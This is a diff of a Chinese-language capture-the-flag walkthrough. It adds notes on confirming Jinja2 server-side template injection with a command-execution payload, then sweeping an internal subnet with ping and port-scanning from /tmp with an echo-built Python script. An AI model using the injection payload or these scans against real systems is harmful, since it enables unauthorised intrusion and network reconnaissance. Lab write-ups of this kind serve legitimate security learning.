@@ -14,7 +14,7 @@ nmap网络扫描
 
 ![](attachments/Pasted%20image%2020230305160729.png)
 
-确认是ssti，虽然现在我们可以通过`{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}`来实现命令执行，但是想要提权还是要获取到shell才行
+确认是ssti，jinja2，虽然现在我们可以通过`{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}`来实现命令执行，但是想要提权还是要获取到shell才行
 
 ![](attachments/Pasted%20image%2020230305164715.png)
 
@@ -237,6 +237,34 @@ anita-hanjaab  ->  60571
 clee-torres    ->  60571
 ```
 
-感觉可能是在暗示端口，想要试试扫描端口，但是发现www-data没有下载东西的权限
+感觉可能是在暗示端口，想要试试扫描端口，但是发现www-data没有下载东西的权限，感觉还是有内网的，没办法下东西就很难受了，啥工具都没有，自己搞脚本扫内网还需要知道自身ip地址才能扫，最后看到IP是用`hostname -I`
+
+![](attachments/Pasted%20image%2020230305181401.png)
+
+这里看看wp，学到了新操作
+
+```shell
+for i in {1..254}; do (ping -c 1 192.168.100.$i | grep "bytes from"&); done
+```
+![](attachments/Pasted%20image%2020230305181852.png)
+
+用`echo`来制作一个python脚本扫描端口
+```shell
+echo 'import socket' > scan.py
+echo 'for port in range(1, 65535):' >> scan.py
+echo '    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)' >> scan.py
+echo '    sock.settimeout(1)' >> scan.py
+echo '    result = sock.connect_ex(("192.168.100.1", port))' >> scan.py
+echo '    if 0 == result:' >> scan.py
+echo '        print(port)' >> scan.py
+echo '    sock.close()' >> scan.py
+```
+
+>需要注意的是在当前目录我们是没有权限写东西的，转到tmp去写
+
+![](attachments/Pasted%20image%2020230305182409.png)
+
+![](attachments/Pasted%20image%2020230305182441.png)
+
 # 参考链接
 [python中的subprocess.Popen() 执行shell命令 - 技术改变命运Andy - 博客园 (cnblogs.com)](https://www.cnblogs.com/andy0816/p/15624304.html)
